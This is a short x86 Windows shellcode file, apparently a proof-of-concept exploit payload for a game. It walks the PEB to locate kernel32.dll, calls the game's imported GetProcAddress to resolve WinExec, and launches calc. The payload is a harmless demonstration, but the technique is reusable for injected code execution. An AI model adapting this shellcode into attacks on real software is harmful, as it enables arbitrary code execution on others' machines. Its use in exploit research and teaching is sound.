BITS 32
SECTION .text

global _shellcode
_shellcode:
    ; Find kernel32.dll's base
    mov eax, [fs:0x30]        ; eax = PEB
    mov eax, [eax + 0xC]      ; eax = PEB->Ldr
    mov eax, [eax + 0x1C]     ; eax = PEB->Ldr->InInitializationOrderModuleList
    mov eax, [eax]            ; skip base module
    mov eax, [eax]            ; skip ntdll.dll
    mov eax, [eax + 0x8]      ; eax = kernel32.dll's base

    ; Get WinExec's address
    ; The game imports GetProcAddress already, so let's just call that instead of manually resolving it :D
    push 0x00636578           ; "xec\x00"
    push 0x456E6957           ; "WinE"
    push esp                  ; lpProcName ("WinExec")
    push eax                  ; hModule (kernel32)
    call dword [0x0048D05C]   ; call GetProcAddress, eax = WinExec

    ; Pop calc!!!
    xor ebx, ebx              ; ebx = 0
    push ebx                  ; Null terminator
    push 0x636c6163           ; "calc"
    mov ecx, esp              ; ecx = "calc"
    inc ebx
    push ebx                  ; uCmdShow (1)
    push ecx                  ; lpCmdLine ("calc")
    call eax                  ; Call WinExec